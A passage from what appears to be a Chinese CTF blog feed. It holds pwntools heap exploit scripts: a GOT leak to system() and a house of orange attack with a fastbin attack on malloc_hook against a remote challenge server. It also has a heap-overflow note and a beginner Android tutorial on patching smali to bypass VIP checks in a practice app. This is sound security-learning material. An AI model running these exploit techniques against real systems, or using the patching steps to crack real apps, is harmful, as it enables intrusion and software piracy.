sd(index)<br><br>def dele(index):<br>    ru(&#x27;Exit&#x27;)<br>    sd(&#x27;2&#x27;)<br>    rl()<br>    sd(index)<br>print_note = 0x80492b6 <br>read_got = 0x804C00C<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">new</span><span class="hljs-params">(&#x27;1056&#x27;,<span class="hljs-string">&quot;AAAA&quot;</span>)</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">new</span><span class="hljs-params">(&#x27;1056&#x27;,<span class="hljs-variable">b</span>&#x27;<span class="hljs-variable">BBBB</span>&#x27;)</span><br><br>new(&#x27;20&#x27;,b&#x27;AAA&#x27;)<br>new(&#x27;20&#x27;,b&#x27;AAA&#x27;)<br>new(&#x27;20&#x27;,b&#x27;AAA&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>show(&#x27;0&#x27;)<br>dele(&#x27;0&#x27;)<br>dele(&#x27;1&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>new(&#x27;8&#x27;,p32(print_note)+p32(read_got))<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>show(&#x27;0&#x27;)<br>read_addr = u32(ru(&#x27;\xf7&#x27;)[-4:])<br>print(hex(read_addr))<br><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>&#x27;&#x27;&#x27;<br>libc_base = read_addr - 0x0f0780<br>system_addr = libc_base + 0x041360 +1<br>&#x27;&#x27;&#x27;<br>libc = ELF(&#x27;/home/kali/Desktop/libc6-i386_2.31-0ubuntu9.14_amd64.so&#x27;)<br><br>libc_base = read_addr  - libc.sym[&#x27;read&#x27;]<br>system_addr = libc_base + libc.sym[&#x27;system&#x27;] <br><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>dele(&#x27;1&#x27;)<br>dele(&#x27;2&#x27;)<br>payload = p32(system_addr)+b&quot;`;$0&quot;<br>print(payload)<br>new(b&#x27;8&#x27;,payload)<br>debug()<br>show(b&#x27;1&#x27;)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><p>另：经实验，确实有语法错误会导致不能执行</p><p><img src="https://telegraph-image-5jy.pages.dev/file/7fdfe7464b5dc7711450d.png" alt="image-20240513125021642"></p><p>所以说跳过第一个endbr32就能让它执行还不懂:dog:</p><p>提交的时候发现+4之后，64就是d了，就不是反引号了，不会报语法错误了，所以就能执行了，与endbr32无关！</p><p>0x60对应的是反引号，0x64对应的是d</p><p><img src="https://telegraph-image-5jy.pages.dev/file/2a6fa3461c47a2c340905.png" alt="image-20240513134737062"></p><p>至于其他的为啥不行，虽然不是反引号了，但是影响了system的正常执行。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>orange_cat</title>
    <link href="/2024/10/23/orange_cat/"/>
    <url>/2024/10/23/orange_cat/</url>
    
    <content type="html"><![CDATA[<h4 id="orange-cat"><a href="#orange-cat" class="headerlink" title="orange_cat"></a>orange_cat</h4><blockquote><p>就出了这一道被打成50分的，我真菜狗一只啊</p></blockquote><p>包含输入、修改、输出、删除的堆块题</p><ol><li>输入函数：只限制了堆块的大小，不限制数量</li></ol><p><img src="https://telegraph-image-5jy.pages.dev/file/94eeae55f146dd5d7e6d0.png" alt="image-20240518162412248"></p><ol start="2"><li><p>输出函数和删除函数都只能用一次</p></li><li><p>edit函数存在7个字节的溢出</p><p><img src="https://telegraph-image-5jy.pages.dev/file/350730badb57c268b9db1.png" alt="image-20240518165434361"></p></li></ol><p>top_chunk 的后三位+size（不包括符号位，符号位要为1），&amp;FFF为0</p><p>先用house of orange（这个网上讲的很好）将topchunk置为unsorted bin。</p><p><img src="https://telegraph-image-5jy.pages.dev/file/9a2726c01ba184e0d1f8d.png" alt="image-20240518165629185"></p><p>创建一个0x60大小的块，从unsoterd bin中分割出来，再打印这个块，打印出对应的libc地址</p><p><img src="https://telegraph-image-5jy.pages.dev/file/8200b4055c2a666be8237.png" alt="image-20240518165748518"></p><p>将这个块free掉，修改它的fd指针为伪造的fast_chunk，然后用fastbin attack 打malloc_hook。</p><p>另：其实不用add那么多次，一次直接改就行，只不过是边打边学的house of orange，刚开始没想明白，后来懒得删上面的了，因为会有些微的地址的差距，懒得再改了。</p><p>exp：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br>context(<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-comment">#p=process(&#x27;./pwn2&#x27;)</span><br><span class="hljs-attribute">p</span>=remote(&#x27;39.106.48.123&#x27;,35999)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def <span class="hljs-built_in">debug</span>():<br>    gdb.attach(p)<br>    pause(1)<br><br>def <span class="hljs-built_in">add</span>(lenth,content):<br>    ru(<span class="hljs-string">&#x27;Exit&#x27;</span>)<br>    sd(b<span class="hljs-string">&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;length&#x27;</span>)<br>    sd(str(lenth))<br>    rl()<br>    sd(content)<br><br>def <span class="hljs-built_in">edit</span>(lenth,content):<br>    ru(<span class="hljs-string">&#x27;Exit&#x27;</span>)<br>    sd(b<span class="hljs-string">&#x27;4&#x27;</span>)<br>    rl()<br>    sd(str(lenth))<br>    rl()<br>    sd(content)<br><br>def dele():<br>    ru(<span class="hljs-string">&#x27;Exit&#x27;</span>)<br>    sd(b<span class="hljs-string">&#x27;3&#x27;</span>)<br><br>def show():<br>    ru(<span class="hljs-string">&#x27;Exit&#x27;</span>)<br>    sd(b<span class="hljs-string">&#x27;2&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;AAAA&#x27;</span>)<br><br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;AAAAA&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&quot;BBBB&quot;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;AAAAA&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&quot;BBBB&quot;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;AAAAA&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&quot;BBBB&quot;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;AAAAA&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&quot;BBBB&quot;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;AAAAA&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&quot;BBBB&quot;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;AAAAA&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&quot;BBBB&quot;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;AAAAA&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&quot;BBBB&quot;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;AAAAA&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&#x27;BBBB&#x27;</span>)<br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&quot;BBBB&quot;</span>)<br><span class="hljs-built_in">add</span>(0x88,b<span class="hljs-string">&quot;bb&quot;</span>)<br><br><span class="hljs-built_in">edit</span>(0x8f,b<span class="hljs-string">&#x27;A&#x27;</span>*(0x88)+p32(0xd71))<br><br><span class="hljs-built_in">add</span>(0x1000,b<span class="hljs-string">&quot;ABCDEFGHIJKLMN&quot;</span>)<br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#show()</span><br><span class="hljs-built_in">add</span>(0x60,b<span class="hljs-string">&#x27;BB&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#pause()</span><br>show()<br>ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/home/kali/Desktop/libc-2.23.so&#x27;</span>)<br>arena = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>hook = arena - 0x88 - 3 - 0x600<br>libc_base = arena -(0x7f96b13c4b78 -0x7f96b1000000  )-0x600<br><span class="hljs-built_in">print</span>(hex(arena))<br><span class="hljs-built_in">print</span>(hex(libc_base))<br>one_gadget = libc_base + 0xf03a4<br>dele()<br><br>payload = b<span class="hljs-string">&#x27;\x00&#x27;</span><span class="hljs-number">*19</span> + p64(one_gadget)<br><br><span class="hljs-built_in">edit</span>(8,p64(hook))<br><br><span class="hljs-built_in">add</span>(0x60,payload)<br><span class="hljs-comment">#debug()</span><br><span class="hljs-built_in">add</span>(0x60,payload)<br><span class="hljs-comment">#debug()</span><br><br>sd(b<span class="hljs-string">&#x27;1&#x27;</span>)<br>rl()<br>sd(b<span class="hljs-string">&#x27;80&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iscc-shopping</title>
    <link href="/2024/10/23/iscc-shopping/"/>
    <url>/2024/10/23/iscc-shopping/</url>
    
    <content type="html"><![CDATA[<h4 id="iscc-shopping"><a href="#iscc-shopping" class="headerlink" title="iscc-shopping"></a>iscc-shopping</h4><ul><li><p>主体的运行是这样的</p><p><img src="https://telegraph-image-5jy.pages.dev/file/8245ec96095b29ea60573.png" alt="image-20240520220207451"></p></li></ul><p>自己输入的这个函数有漏动，read_by_me，可以溢出（这里第一次输入小于size，就可以再输入一次（这次仍然是一个小于size的数）</p><p><img src="https://telegraph-image-5jy.pages.dev/file/6142cf0752fa70078600e.png" alt="image-20240520220259734"></p><p>不断创建堆块，让块与thread2的arena相邻，通过写的溢出，填充thread2的areana，将fastbin的记录位置填充为bss的call的地址，下面是填充后的结果</p><p><img src="https://telegraph-image-5jy.pages.dev/file/9b26291fc05c076bebb81.png" alt="image-20240525115937910"></p><p>将0x602038的位置填入system，并在2d处填入\bin\sh，注意地址字节的对齐。选择1d是为了fastbin的检测。</p><p><img src="https://telegraph-image-5jy.pages.dev/file/aa2027cbc2d41979c4bf4.png" alt="image-20240525121030127"></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初学安卓逆向（课是关卡+1）</title>
    <link href="/2004/01/01/%E5%88%9D%E5%AD%A6%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"/>
    <url>/2004/01/01/%E5%88%9D%E5%AD%A6%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h1 id="初学安卓逆向（课是关卡-1）"><a href="#初学安卓逆向（课是关卡-1）" class="headerlink" title="初学安卓逆向（课是关卡+1）"></a>初学安卓逆向（课是关卡+1）</h1><blockquote><p>新手出学安卓逆向，有一点点pwn的二进制基础，直接从b站正己的教程上跟着做，先看一遍视频，然后再实操一下，忘了的再回头看（本来是跟着做的，结果发现那样子效率不高，容易忘）</p><p>b站教程地址：<a href="https://www.bilibili.com/video/BV14v4y1D7yA/?spm_id_from=333.788&vd_source=5aaa6cf536f1e9f7b67225df23bb5e07">吾爱破解安卓逆向入门教程《安卓逆向这档事》</a></p></blockquote><ol><li><p>所储存显示字符串的地方</p><ul><li>arsc</li><li>xml</li><li>dex</li></ul></li><li><p>对于应用程序，先进行安装包提取</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409111701592.png" alt="image-20240911170033531"></p><ol start="3"><li>np管理器里的通用编辑直接继承好了如何修改app名字和图表，本质是在xml文件内有配置信息，（但是修改了之后没有显示？）</li><li>xml中mt管理器修改activity更稳定，activitiy的主页面修改可以选择跳转窗口。</li></ol></li></ol><h2 id="第一关重现"><a href="#第一关重现" class="headerlink" title="第一关重现"></a>第一关重现</h2><ol><li><p>改包名双开，直接在NP或MT管理器中，选择APK共存，修改包名，就能同时安装两个相同的文件了。<img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131140027.png" alt="image-20240913114012967"></p></li><li><p>字符串的修改替换与汉化</p><p>原本：</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131141412.png" alt="image-20240913114137345"></p><ul><li><p>逐个修改：定位选择后，找到对应的文件，然后修改。（比如将hello world修改为hello xyyr）</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131142197.png" alt="image-20240913114233171"></p><p>寻找的方法是在这里搜索，然后找到对应的文件，进行修改（arsc文件在mt需要会员，这里用np）</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131143575.png" alt="image-20240913114345509"></p><p>如图搜索到这里，进行更改即可（一般字符串都在这里，可以批量对这儿进行汉化）</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131146634.png" alt="image-20240913114645576"></p></li></ul></li></ol><p>  替换后如图<img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410232109156.png" alt="image-20240913115049374"><br>3. 图片更改以及图标</p><p>   用开发助手的布局查看，点击查看表项（长按可以复制）</p><p>   <img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131516441.png" alt="image-20240913151650362"></p><p>  然后要用MT管理器的搜索，xml搜索，用资源id搜（np没有找到这个功能）</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131522663.png" alt="image-20240913152254616"></p><p>搜索后找到jf.xml</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131524713.png" alt="image-20240913152446677"></p><p>srcCompat是对应的路径，但是认不出来，把它复制下来，在mt管理器，打开arsc文件，选择arsc编辑器（只有这个不需要会员），id定位资源</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131528304.png"></p><p>定位后就可以找到它了，把cf.jpg删了，把想要的图片名字改成cf.jpg，就可以替换过去了。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131529208.png" alt="image-20240913152956177"></p><p>最终效果：</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131535823.png" alt="image-20240913153548749"></p><h2 id="第二关重现"><a href="#第二关重现" class="headerlink" title="第二关重现"></a>第二关重现</h2><p>搜索大会员找到相应的位置</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131542458.png" alt="image-20240913154221376"></p><ol><li><p>修改判断<br><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131544902.png" alt="image-20240913154435786"></p><p>根据名字找到这个方法，如果p0&gt;&#x3D;v0，就跳转到了cond_15，否则继续走到.line34，unicode编码解码后的中文对应的是请先获得10个硬币哦</p><p>将ge改为le，往下翻，点住跳转的isvip（）,将返回值改为1，注意这里函数返回的是寄存器，所以把寄存器的复制改为1</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131556608.png" alt="image-20240913155640585"></p><p>成功，还是比较简单的。</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131601078.png" alt="image-20240913160114035"></p></li><li><p>强制跳转</p></li><li><p>修改寄存器的值</p><p>两种方法一起实践了，这里改值，0硬币就可以投币，并将到vip判断的强制跳转更改到line37的大会员投币成功</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131605703.png" alt="image-20240913160505650"></p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131606158.png" alt="image-20240913160615121"></p><p>重新安装签名后，成功。（后来看到，这不算是强制跳转，强制跳转是将if语句改为goto(区别不大，不再来一遍了，继续往下)</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409131609498.png" alt="image-20240913160911467"></p></li></ol><h2 id="第三关重现"><a href="#第三关重现" class="headerlink" title="第三关重现"></a>第三关重现</h2><ol><li><p>启动时的3s广告（这属于activity类的广子）</p><p>（1）不推荐的用法：</p><p>用算法助手辨析到对应的一整串名字后，搜索xml文件，将主activity直接修改到第三关的activity，这样一打开就会直接进入</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409141645838.png" alt="image-20240914164510710"></p></li></ol><p>（2）修改停留时长</p><p>这是开屏广告的activity</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409141648138.png" alt="image-20240914164816093"></p><p>搜索AdActivity</p><p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202409141649410.png" alt="image-20240914164930380"></p><p>找到对应的方法</p><p>把代码扒下来</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs wren"><br><span class="hljs-comment">// Decompiled by Jadx (from NP Manager)</span><br><span class="hljs-comment">//</span><br><span class="hljs-variable">package</span> <span class="hljs-variable">com</span>.<span class="hljs-property">zj</span>.<span class="hljs-property">wuaipojie</span>.<span class="hljs-property">ui</span>;<br><br><span class="hljs-keyword">import</span> <span class="hljs-variable">android</span>.<span class="hljs-property">content</span>.<span class="hljs-property">Context</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-variable">android</span>.<span class="hljs-property">content</span>.<span class="hljs-property">Intent</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-variable">android</span>.<span class="hljs-property">os</span>.<span class="hljs-property">Bundle</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-variable">android</span>.<span class="hljs-property">os</span>.<span class="hljs-property">Handler</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-variable">androidx</span>.<span class="hljs-property">appcompat</span>.<span class="hljs-property">app</span>.<span class="hljs-property">AppCompatActivity</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-variable">com</span>.<span class="hljs-property">zj</span>.<span class="hljs-property">wuaipojie</span>.<span class="hljs-property">ui</span>.<span class="hljs-property">AdActivity</span>$.<span class="hljs-property">ExternalSyntheticLambda0</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-variable">kotlin</span>.<span class="hljs-property">Metadata</span>;<br><br>@<span class="hljs-title class_">Metadata</span>(<span class="hljs-variable">d1</span> <span class="hljs-operator">=</span> &#123;<span class="hljs-string">&quot;<span class="hljs-char escape_">\u0000</span>\u001a<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\u0002</span><span class="hljs-char escape_">\u0018</span><span class="hljs-char escape_">\u0002</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\u0002</span><span class="hljs-char escape_">\u0018</span><span class="hljs-char escape_">\u0002</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\u0002</span><span class="hljs-char escape_">\b</span><span class="hljs-char escape_">\u0002</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\u0002</span><span class="hljs-char escape_">\u0010</span><span class="hljs-char escape_">\u0002</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\u0002</span><span class="hljs-char escape_">\b</span><span class="hljs-char escape_">\u0003</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\u0002</span><span class="hljs-char escape_">\u0018</span><span class="hljs-char escape_">\u0002</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\u0000</span><span class="hljs-char escape_">\u0018</span><span class="hljs-char escape_">\u0000</span>2<span class="hljs-char escape_">\u0002</span>0<span class="hljs-char escape_">\u0001</span>B<span class="hljs-char escape_">\u0005</span>¢<span class="hljs-char escape_">\u0006</span><span class="hljs-char escape_">\u0002</span><span class="hljs-char escape_">\u0010</span><span class="hljs-char escape_">\u0002</span>J<span class="hljs-char escape_">\b</span><span class="hljs-char escape_">\u0010</span><span class="hljs-char escape_">\u0003</span>\u001a<span class="hljs-char escape_">\u0002</span>0<span class="hljs-char escape_">\u0004</span>H<span class="hljs-char escape_">\u0002</span>J<span class="hljs-char escape_">\b</span><span class="hljs-char escape_">\u0010</span><span class="hljs-char escape_">\u0005</span>\u001a<span class="hljs-char escape_">\u0002</span>0<span class="hljs-char escape_">\u0004</span>H<span class="hljs-char escape_">\u0002</span>J<span class="hljs-char escape_">\u0012</span><span class="hljs-char escape_">\u0010</span><span class="hljs-char escape_">\u0006</span>\u001a<span class="hljs-char escape_">\u0002</span>0<span class="hljs-char escape_">\u0004</span>2<span class="hljs-char escape_">\b</span><span class="hljs-char escape_">\u0010</span><span class="hljs-char escape_">\u0007</span>\u001a<span class="hljs-char escape_">\u0004</span><span class="hljs-char escape_">\u0018</span><span class="hljs-char escape_">\u0001</span>0<span class="hljs-char escape_">\b</span>H<span class="hljs-char escape_">\u0014</span>¨<span class="hljs-char escape_">\u0006</span><span class="hljs-char escape_">\t</span>&quot;</span>&#125;, <span class="hljs-variable">d2</span> <span class="hljs-operator">=</span> &#123;<span class="hljs-string">&quot;Lcom/zj/wuaipojie/ui/AdActivity;&quot;</span>, <span class="hljs-string">&quot;Landroidx/appcompat/app/AppCompatActivity;&quot;</span>, <span class="hljs-string">&quot;()V&quot;</span>, <span class="hljs-string">&quot;jump&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;loadAd&quot;</span>, <span class="hljs-string">&quot;onCreate&quot;</span>, <span class="hljs-string">&quot;savedInstanceState&quot;</span>, <span class="hljs-string">&quot;Landroid/os/Bundle;&quot;</span>, <span class="hljs-string">&quot;app_release&quot;</span>&#125;, <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>, <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> &#123;<span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>&#125;, <span class="hljs-variable">xi</span> <span class="hljs-operator">=</span> <span class="hljs-number">48</span>)<br><span class="hljs-comment">/* compiled from: AdActivity.kt */</span><br><span class="hljs-variable">public</span> <span class="hljs-variable">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdActivity</span> <span class="hljs-variable">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-variable">protected</span> <span class="hljs-variable">void</span> <span class="hljs-title function_">onCreate</span>(<span class="hljs-params">Bundle</span> <span class="hljs-params">bundle</span>) &#123;<br>        <span class="hljs-variable language_">super</span>.<span class="hljs-property">onCreate</span>(<span class="hljs-variable">bundle</span>);<br>        <span class="hljs-title function_">setContentView</span>(<span class="hljs-number">2131427363</span>);<br>        <span class="hljs-title function_">loadAd</span>();<br>    &#125;<br><br>    <span class="hljs-variable">private</span> <span class="hljs-variable">final</span> <span class="hljs-variable">void</span> <span class="hljs-title function_">jump</span>() &#123;<br>        <span class="hljs-title function_">startActivity</span>(<span class="hljs-variable">new</span> <span class="hljs-title class_">Intent</span>((<span class="hljs-title class_">Context</span>) <span class="hljs-variable language_">this</span>, <span class="hljs-title class_">ChallengeThird</span>.<span class="hljs-property">class</span>));<br>        <span class="hljs-title function_">finish</span>();<br>    &#125;<br><br>    <span class="hljs-variable">private</span> <span class="hljs-variable">final</span> <span class="hljs-variable">void</span> <span class="hljs-title function_">loadAd</span>() &#123;<br>        <span class="hljs-variable">new</span> <span class="hljs-title class_">Handler</span>().<span class="hljs-property">postDelayed</span>(<span class="hljs-variable">new</span> <span class="hljs-title class_">ExternalSyntheticLambda</span>0(<span class="hljs-variable language_">this</span>), <span class="hljs-number">3000</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* renamed from: loadAd$lambda-0 */</span><br>    <span class="hljs-variable">private</span> <span class="hljs-keyword">static</span> <span class="hljs-variable">final</span> <span class="hljs-variable">void</span> <span class="hljs-variable">m0loadAd</span>$<span class="hljs-variable">lambda</span><span class="hljs-number">-0</span>(<span class="hljs-title class_">AdActivity</span> <span class="hljs-variable">adActivity</span>) &#123;<br>        <span class="hljs-variable">adActivity</span>.<span class="hljs-property">jump</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>大致解释一下逻辑：</p><blockquote><p>由于 onCreate 是 Android 